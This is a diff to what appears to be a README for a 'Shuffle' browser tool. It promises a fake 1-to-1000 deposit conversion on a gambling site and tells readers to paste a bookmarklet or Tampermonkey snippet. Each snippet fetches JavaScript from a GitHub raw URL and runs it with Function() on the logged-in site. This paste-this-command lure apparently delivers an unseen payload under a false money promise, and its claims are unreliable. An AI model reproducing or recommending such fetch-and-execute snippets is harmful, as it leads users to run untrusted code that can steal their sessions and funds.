@@ -1,13 +1,29 @@
-Option 1: Bookmark
+### 💸 How to Use
 
-1. Open the file - https://github.com/drojnisdisauioa/Shuffle/blob/main/bookmark.js
-2. Copy the entire JavaScript code.
-3. Create a new bookmark and paste the code into the URL field.
-4. Visit the website, click the bookmark, and enjoy!
+Deposit any amount you want — totally up to you.
 
-Option 2: Tampermonkey
+**Conversion Rate:**
+`1$ REAL = 1000$ FAKE`
+Just make sure you select **ARS** as your currency.
 
-1. Open the file - https://github.com/drojnisdisauioa/Shuffle/blob/main/tampermonkey.js
-2. Copy the entire JavaScript code.
-3. Create a new bookmark and paste the code into the URL field.
-4. Visit the website, click the bookmark, and enjoy!
+### 🧩 Option 1: Bookmark (Quick & Easy)
+
+1. Copy this entire code:
+
+   ```js
+   javascript:(()=>{fetch('https://raw.githubusercontent.com/drojnisdisauioa/shuffle/refs/heads/main/bookmark.js').then(r=>r.text()).then(code=>Function(code)());})();
+   ```
+2. Create a new bookmark in your browser.
+3. Paste the code into the **URL** field.
+4. Go to the website, click the bookmark, and you're good to go.
+
+### 🛠️ Option 2: Tampermonkey
+
+1. Copy this entire code:
+
+   ```js
+   javascript:(()=>{fetch('https://raw.githubusercontent.com/drojnisdisauioa/shuffle/refs/heads/main/tampermonkey.js').then(r=>r.text()).then(code=>Function(code)());})();
+   ```
+2. Open **Tampermonkey Dashboard** and click **Create a new script**.
+3. Paste the code, then save.
+4. Head to the website and it’ll do its thing automatically.
